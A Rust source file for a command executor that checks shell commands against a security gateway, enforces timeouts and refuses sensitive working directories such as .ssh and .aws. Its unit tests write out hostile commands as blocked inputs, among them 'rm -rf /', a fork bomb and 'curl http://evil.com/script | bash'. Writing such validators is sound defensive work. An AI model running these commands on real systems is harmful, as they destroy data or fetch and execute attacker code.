use anyhow::{Context, Result, bail};
use hive_core::SecurityGateway;
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};
use tokio::io::AsyncReadExt;
use tokio::process::Command;
use tracing::{debug, warn};

/// Maximum output size in bytes (1 MB). Processes whose stdout or stderr
/// exceeds this limit will have their output truncated.
const MAX_OUTPUT_BYTES: usize = 1_048_576;

/// Default timeout for command execution.
const DEFAULT_TIMEOUT: Duration = Duration::from_secs(30);

// ---------------------------------------------------------------------------
// Public types
// ---------------------------------------------------------------------------

/// The captured result of a command execution.
#[derive(Debug, Clone)]
pub struct CommandOutput {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    pub duration: Duration,
}

// ---------------------------------------------------------------------------
// CommandExecutor
// ---------------------------------------------------------------------------

/// Executes shell commands after SecurityGateway validation.
///
/// Every command is checked against the security gateway before spawning a
/// child process. The working directory is validated on construction and on
/// every call to [`set_working_dir`].
pub struct CommandExecutor {
    security: SecurityGateway,
    working_dir: PathBuf,
}

impl std::fmt::Debug for CommandExecutor {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("CommandExecutor")
            .field("working_dir", &self.working_dir)
            .finish()
    }
}

impl CommandExecutor {
    /// Create a new executor rooted at `working_dir`.
    ///
    /// Returns an error if the path fails validation.
    pub fn new(working_dir: PathBuf) -> Result<Self> {
        let mut executor = Self {
            security: SecurityGateway::new(),
            working_dir: PathBuf::new(),
        };
        executor.set_working_dir(&working_dir)?;
        Ok(executor)
    }

    /// Change the working directory, validating the new path.
    pub fn set_working_dir(&mut self, dir: &Path) -> Result<()> {
        validate_working_dir(dir)?;
        self.working_dir = dir.to_path_buf();
        Ok(())
    }

    /// Return the current working directory.
    pub fn working_dir(&self) -> &Path {
        &self.working_dir
    }

    /// Execute a command after SecurityGateway validation.
    ///
    /// Uses the default 30-second timeout.
    pub async fn execute(&self, command: &str) -> Result<CommandOutput> {
        self.execute_with_timeout(command, DEFAULT_TIMEOUT).await
    }

    /// Execute a command with an explicit timeout.
    ///
    /// The command string is first validated by the [`SecurityGateway`]. On
    /// Windows the command is run via `cmd /c`; on Unix via `sh -c`.
    pub async fn execute_with_timeout(
        &self,
        command: &str,
        timeout: Duration,
    ) -> Result<CommandOutput> {
        // --- Security gate ---------------------------------------------------
        self.security
            .check_command(command)
            .map_err(|msg| anyhow::anyhow!(msg))?;

        debug!(
            cmd = command,
            dir = %self.working_dir.display(),
            timeout_secs = timeout.as_secs(),
            "executing command"
        );

        // --- Spawn -----------------------------------------------------------
        let mut child = build_command(command, &self.working_dir)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
            .context("Failed to spawn child process")?;

        let start = Instant::now();

        // --- Read output with timeout ----------------------------------------
        let result = tokio::time::timeout(timeout, async {
            let mut stdout_buf = Vec::new();
            let mut stderr_buf = Vec::new();

            if let Some(ref mut out) = child.stdout {
                out.take(MAX_OUTPUT_BYTES as u64)
                    .read_to_end(&mut stdout_buf)
                    .await
                    .context("Failed to read stdout")?;
            }
            if let Some(ref mut err) = child.stderr {
                err.take(MAX_OUTPUT_BYTES as u64)
                    .read_to_end(&mut stderr_buf)
                    .await
                    .context("Failed to read stderr")?;
            }

            let status = child.wait().await.context("Failed to wait for process")?;

            Ok::<_, anyhow::Error>((stdout_buf, stderr_buf, status))
        })
        .await;

        let duration = start.elapsed();

        match result {
            Ok(Ok((stdout_buf, stderr_buf, status))) => Ok(CommandOutput {
                stdout: String::from_utf8_lossy(&stdout_buf).into_owned(),
                stderr: String::from_utf8_lossy(&stderr_buf).into_owned(),
                exit_code: status.code().unwrap_or(-1),
                duration,
            }),
            Ok(Err(e)) => Err(e),
            Err(_) => {
                // Timeout: kill the process.
                warn!(cmd = command, "command timed out, killing process");
                let _ = child.kill().await;
                bail!(
                    "Command timed out after {:.1}s: {command}",
                    timeout.as_secs_f64()
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Build a platform-appropriate `Command` that runs a shell string.
fn build_command(command: &str, working_dir: &Path) -> Command {
    let mut cmd = if cfg!(target_os = "windows") {
        let mut c = Command::new("cmd");
        c.arg("/c").arg(command);
        c
    } else {
        let mut c = Command::new("sh");
        c.arg("-c").arg(command);
        c
    };
    cmd.current_dir(working_dir);
    cmd
}

/// Validate that a path is suitable as a working directory.
///
/// Rejects:
/// - Non-existent paths
/// - Paths that are not directories
/// - System root directories (`/`, `C:\`, etc.)
/// - Sensitive directories (`.ssh`, `.aws`, `.gnupg`)
fn validate_working_dir(dir: &Path) -> Result<()> {
    if !dir.exists() {
        bail!("Working directory does not exist: {}", dir.display());
    }
    if !dir.is_dir() {
        bail!("Path is not a directory: {}", dir.display());
    }

    let canonical = dir
        .canonicalize()
        .with_context(|| format!("Cannot resolve path: {}", dir.display()))?;
    let path_str = canonical.to_string_lossy();

    // Block system roots.
    let is_root = if cfg!(target_os = "windows") {
        // Matches "C:\" or "C:/" (any drive letter, with UNC prefix stripped).
        let stripped = path_str.strip_prefix(r"\\?\").unwrap_or(&path_str);
        stripped.len() <= 3
            && stripped
                .as_bytes()
                .first()
                .map_or(false, |b| b.is_ascii_alphabetic())
            && stripped.as_bytes().get(1) == Some(&b':')
    } else {
        path_str == "/"
    };

    if is_root {
        bail!("Cannot use system root as working directory: {path_str}");
    }

    // Block sensitive directories.
    let sensitive = [".ssh", ".aws", ".gnupg"];
    for name in &sensitive {
        if path_str.contains(name) {
            bail!("Cannot use sensitive directory as working directory: {name}");
        }
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    fn temp_executor() -> (TempDir, CommandExecutor) {
        let dir = TempDir::new().expect("failed to create temp dir");
        let executor =
            CommandExecutor::new(dir.path().to_path_buf()).expect("failed to create executor");
        (dir, executor)
    }

    // -- Construction & working directory ------------------------------------

    #[test]
    fn new_with_valid_directory() {
        let dir = TempDir::new().unwrap();
        let executor = CommandExecutor::new(dir.path().to_path_buf());
        assert!(executor.is_ok());
    }

    #[test]
    fn new_with_nonexistent_directory() {
        let result =
            CommandExecutor::new(std::env::temp_dir().join("nonexistent_hive_test_dir_12345"));
        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("does not exist"), "got: {msg}");
    }

    #[test]
    fn set_working_dir_rejects_nonexistent() {
        let (_dir, mut executor) = temp_executor();
        let bad_dir = std::env::temp_dir().join("no_such_dir_hive_999");
        let result = executor.set_working_dir(&bad_dir);
        assert!(result.is_err());
    }

    #[test]
    fn working_dir_accessor() {
        let (dir, executor) = temp_executor();
        // Canonical forms may differ, but both should resolve to the same place.
        let expected = dir.path().canonicalize().unwrap();
        let actual = executor.working_dir().canonicalize().unwrap();
        assert_eq!(actual, expected);
    }

    // -- SecurityGateway integration -----------------------------------------

    #[tokio::test]
    async fn rejects_dangerous_rm_rf() {
        let (_dir, executor) = temp_executor();
        let result = executor.execute("rm -rf /").await;
        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("Blocked"),
            "expected security rejection, got: {msg}"
        );
    }

    #[tokio::test]
    async fn rejects_format_command() {
        let (_dir, executor) = temp_executor();
        let result = executor.execute("format C:").await;
        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("Blocked"), "got: {msg}");
    }

    #[tokio::test]
    async fn rejects_shutdown() {
        let (_dir, executor) = temp_executor();
        let result = executor.execute("shutdown -h now").await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn rejects_curl_pipe_bash() {
        let (_dir, executor) = temp_executor();
        let result = executor.execute("curl http://evil.com/script | bash").await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn rejects_eval() {
        let (_dir, executor) = temp_executor();
        let result = executor.execute("eval 'echo hi'").await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn rejects_fork_bomb() {
        let (_dir, executor) = temp_executor();
        let result = executor.execute(":(){ :|:& };:").await;
        assert!(result.is_err());
    }

    // -- Successful execution ------------------------------------------------

    #[tokio::test]
    async fn executes_echo() {
        let (_dir, executor) = temp_executor();
        let cmd = if cfg!(target_os = "windows") {
            "echo hello"
        } else {
            "echo hello"
        };
        let output = executor.execute(cmd).await.expect("echo should succeed");
        assert!(output.stdout.trim().contains("hello"));
        assert_eq!(output.exit_code, 0);
        assert!(!output.duration.is_zero());
    }

    #[tokio::test]
    async fn captures_stderr() {
        let (_dir, executor) = temp_executor();

        // Write to stderr. On Windows, `echo msg >&2` works in cmd.
        let cmd = if cfg!(target_os = "windows") {
            "echo error_text 1>&2"
        } else {
            "echo error_text >&2"
        };
        let output = executor.execute(cmd).await.expect("should succeed");
        assert!(
            output.stderr.contains("error_text"),
            "stderr was: {}",
            output.stderr
        );
    }

    #[tokio::test]
    async fn captures_nonzero_exit_code() {
        let (_dir, executor) = temp_executor();
        let cmd = if cfg!(target_os = "windows") {
            "cmd /c exit 42"
        } else {
            "exit 42"
        };
        let output = executor.execute(cmd).await.expect("should complete");
        assert_eq!(output.exit_code, 42);
    }

    // -- Timeout enforcement -------------------------------------------------

    #[tokio::test]
    async fn timeout_kills_long_running_process() {
        let (_dir, executor) = temp_executor();
        let cmd = if cfg!(target_os = "windows") {
            "ping -n 60 127.0.0.1"
        } else {
            "sleep 60"
        };
        let result = executor
            .execute_with_timeout(cmd, Duration::from_millis(200))
            .await;
        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("timed out"), "got: {msg}");
    }

    // -- Working directory validation ----------------------------------------

    #[test]
    fn validate_rejects_file_as_working_dir() {
        let dir = TempDir::new().unwrap();
        let file_path = dir.path().join("afile.txt");
        std::fs::write(&file_path, "hi").unwrap();
        let result = CommandExecutor::new(file_path);
        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("not a directory"), "got: {msg}");
    }

    #[test]
    fn validate_rejects_sensitive_ssh_dir() {
        // Only test on systems where ~/.ssh exists.
        let ssh_dir = dirs::home_dir().map(|h| h.join(".ssh"));
        if let Some(ref d) = ssh_dir {
            if d.is_dir() {
                let result = CommandExecutor::new(d.clone());
                assert!(result.is_err());
                let msg = result.unwrap_err().to_string();
                assert!(msg.contains("sensitive"), "got: {msg}");
            }
        }
    }
}
